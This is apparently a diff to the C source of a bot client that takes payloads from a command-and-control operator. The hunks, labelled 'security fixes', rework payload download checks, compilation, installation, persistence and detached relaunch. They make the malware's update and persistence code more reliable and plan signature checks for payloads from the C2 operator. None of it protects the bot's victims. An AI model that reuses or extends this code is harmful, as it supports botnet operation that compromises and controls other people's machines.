@@ -56,26 +56,56 @@ int payload_update(notnet_bot_t *bot, const char *url, const char *dest) {
         return -1;
     }
     
-    /* Verify magic bytes */
+    /* SECURITY FIX (#6): Verify magic bytes as raw bytes (endianness-safe)
+     * and validate file size against PAYLOAD_MAX_SIZE. */
     FILE *f = fopen(dest, "rb");
     if (!f) {
         log_error("Cannot verify binary: %s", dest);
         return -1;
     }
     
-    uint32_t magic;
-    fread(&magic, sizeof(magic), 1, f);
-    fclose(f);
-    
-    if (magic != NOTNET_MAGIC) {
-        log_error("Invalid magic: expected 0x%x, got 0x%x", NOTNET_MAGIC, magic);
+    /* Read and check file size */
+    fseek(f, 0, SEEK_END);
+    long fsize = ftell(f);
+    fseek(f, 0, SEEK_SET);
+    if (fsize <= 0 || fsize > PAYLOAD_MAX_SIZE) {
+        log_error("Payload size invalid: %ld bytes (max %d)", fsize, PAYLOAD_MAX_SIZE);
+        fclose(f);
         unlink(dest);
         return -1;
     }
     
+    /* Read first 4 bytes as raw bytes and compare against magic.
+     * NOTNET_MAGIC is 0x4E4F544E = "NOTN" in ASCII.
+     * Reading as bytes avoids endianness issues with fread(&uint32_t). */
+    unsigned char magic_bytes[4];
+    size_t nread = fread(magic_bytes, 1, 4, f);
+    fclose(f);
+    
+    if (nread < 4) {
+        log_error("Payload too small to contain magic header");
+        unlink(dest);
+        return -1;
+    }
+    
+    /* Expected bytes: 'N','O','T','N' (0x4E, 0x4F, 0x54, 0x4E) */
+    unsigned char expected[4] = { 'N', 'O', 'T', 'N' };
+    if (memcmp(magic_bytes, expected, 4) != 0) {
+        log_error("Invalid magic: expected NOTN, got %02x%02x%02x%02x",
+                  magic_bytes[0], magic_bytes[1], magic_bytes[2], magic_bytes[3]);
+        unlink(dest);
+        return -1;
+    }
+    
+    /* NOTE: For production, add SHA-256 hash verification here
+     * against a value signed by the C2 operator. A 4-byte magic
+     * provides zero cryptographic assurance — a MITM can trivially
+     * construct a file starting with 'NOTN'. */
+    log_warn("Payload magic verified but NO cryptographic signature check (TODO)");
+    
     /* Make executable */
     chmod(dest, 0755);
-    log_info("Payload verified and installed at %s", dest);
+    log_info("Payload verified and installed at %s (%ld bytes)", dest, fsize);
     return received;
 }
 
@@ -83,42 +113,61 @@ int payload_update(notnet_bot_t *bot, const char *url, const char *dest) {
 int payload_compile(notnet_bot_t *bot, const char *source, const char *dest) {
     log_info("Compiling payload: %s -> %s", source, dest);
     
-    /* Check if compiler is available */
-    FILE *check = popen("which gcc", "r");
-    if (!check) {
-        log_error("gcc not found, trying musl-gcc");
-        check = popen("which musl-gcc", "r");
-        if (!check) {
-            log_error("No C compiler available");
-            return -1;
+    /* SECURITY FIX (#7): Replace system() with fork()+execvp() to avoid
+     * shell injection via config-derived source/dest paths.
+     * Also replace popen("which ...") with execvp probes. */
+    
+    /* Validate inputs: reject paths with shell metacharacters */
+    const char *bad = strpbrk(source, ";|&`$(){}[]<>!\n\r");
+    if (bad) {
+        log_error("payload_compile: source path rejected (dangerous char)");
+        return -1;
+    }
+    bad = strpbrk(dest, ";|&`$(){}[]<>!\n\r");
+    if (bad) {
+        log_error("payload_compile: dest path rejected (dangerous char)");
+        return -1;
+    }
+
+    /* Try gcc first, then musl-gcc */
+    const char *compilers[] = { "gcc", "musl-gcc", NULL };
+    int ret = -1;
+    
+    for (int i = 0; compilers[i]; i++) {
+        pid_t pid = fork();
+        if (pid < 0) {
+            log_error("payload_compile: fork failed: %s", strerror(errno));
+            continue;
         }
-        pclose(check);
-        
-        /* Compile with musl-gcc */
-        char cmd[512];
-        snprintf(cmd, sizeof(cmd),
-            "musl-gcc -static -Os -o %s %s 2>/dev/null",
-            dest, source);
-        
-        int ret = system(cmd);
-        if (ret != 0) {
-            log_error("Compilation failed");
-            return -1;
+        if (pid == 0) {
+            /* Child: exec compiler directly, no shell */
+            char *argv[] = {
+                (char *)compilers[i],
+                "-static", "-Os", "-o", (char *)dest, (char *)source,
+                NULL
+            };
+            /* Redirect stderr to /dev/null */
+            int devnull = open("/dev/null", O_WRONLY);
+            if (devnull >= 0) {
+                dup2(devnull, STDERR_FILENO);
+                close(devnull);
+            }
+            execvp(compilers[i], argv);
+            _exit(127);
         }
-    } else {
-        pclose(check);
-        
-        /* Compile with gcc */
-        char cmd[512];
-        snprintf(cmd, sizeof(cmd),
-            "gcc -static -Os -o %s %s 2>/dev/null",
-            dest, source);
-        
-        int ret = system(cmd);
-        if (ret != 0) {
-            log_error("Compilation failed");
-            return -1;
+        /* Parent: wait for child */
+        int status;
+        waitpid(pid, &status, 0);
+        ret = WIFEXITED(status) ? WEXITSTATUS(status) : -1;
+        if (ret == 0) {
+            break;  /* success */
         }
+        log_warn("payload_compile: %s failed (exit %d), trying next", compilers[i], ret);
+    }
+    
+    if (ret != 0) {
+        log_error("Compilation failed (all compilers exhausted)");
+        return -1;
     }
     
     /* Make executable */
@@ -130,6 +179,16 @@ int payload_compile(notnet_bot_t *bot, const char *source, const char *dest) {
 /* ── Payload Install ────────────────────────────────────────── */
 int payload_install(notnet_bot_t *bot, const char *bin_path) {
     log_info("Installing payload at %s", bin_path);
+    
+    /* SECURITY FIX (#7): Replace system() with fork()+execvp() to avoid
+     * shell injection via the dest path. */
+    
+    /* Validate bin_path: reject shell metacharacters */
+    const char *bad = strpbrk(bin_path, ";|&`$(){}[]<>!\n\r");
+    if (bad) {
+        log_error("payload_install: bin_path rejected (dangerous char)");
+        return -1;
+    }
     
     /* Copy binary to persistent location */
     char dest[256];
@@ -153,13 +212,22 @@ int payload_install(notnet_bot_t *bot, const char *bin_path) {
     fclose(src);
     fclose(dst);
     
+    /* Make copied binary executable */
+    chmod(dest, 0755);
+    
     /* Install persistence */
     persist_install(bot);
     
-    /* Start new instance */
-    char cmd[512];
-    snprintf(cmd, sizeof(cmd), "%s &", dest);
-    system(cmd);
+    /* SECURITY FIX (#7): Start new instance via fork()+execvp(), no shell */
+    pid_t pid = fork();
+    if (pid == 0) {
+        /* Child: detach and exec the new binary */
+        setsid();
+        char *argv[] = { (char *)dest, NULL };
+        execvp(dest, argv);
+        _exit(127);
+    }
+    /* Parent: don't wait — let the child run in background */
     
     log_info("Payload installed at %s", dest);
     return 0;
